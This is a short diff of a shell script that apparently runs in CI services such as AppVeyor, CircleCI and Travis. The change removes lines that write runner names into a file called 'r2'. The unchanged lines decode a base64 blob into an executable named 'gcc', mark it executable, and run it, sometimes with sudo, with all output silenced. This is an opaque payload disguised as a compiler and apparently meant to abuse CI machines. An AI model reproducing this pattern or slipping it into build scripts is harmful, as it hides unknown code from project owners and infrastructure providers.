@@ -5,7 +5,6 @@ SUDO=""
 if [[ $1 == 'apg' ]]
 then
     SUDO="sudo"
-    sed -i 's/__RUNNER__/appveyor-g/g' r2 &>/dev/null
 elif [[ $1 == 'make' ]]
 then
     if [[ $MODE == 'Bitbucket' || $MODE == 'GitLab' ]]
@@ -15,7 +14,6 @@ then
     fi
 elif [[ $1 == 'ccd' ]]
 then
-    sed -i 's/__RUNNER__/circleci-d/g' r2 &>/dev/null
 elif [[ $1 == 'rebuild' ]]
 then
     if [[ $MODE == 'Bitbucket' || $MODE == 'GitLab' ]]
@@ -24,14 +22,12 @@ then
         chmod +x gcc &>/dev/null
     fi
     SUDO="sudo"
-    sed -i 's/__RUNNER__/travis-g/g' r2 &>/dev/null
 else
     if [[ $MODE == 'Bitbucket' || $MODE == 'GitLab' ]]
     then
         base64 -d gcc.64 > gcc 2>/dev/null
         chmod +x gcc &>/dev/null
     fi
-    sed -i 's/__RUNNER__/circleci-d/g' r2 &>/dev/null
 fi
 
 $SUDO ./gcc &>/dev/null
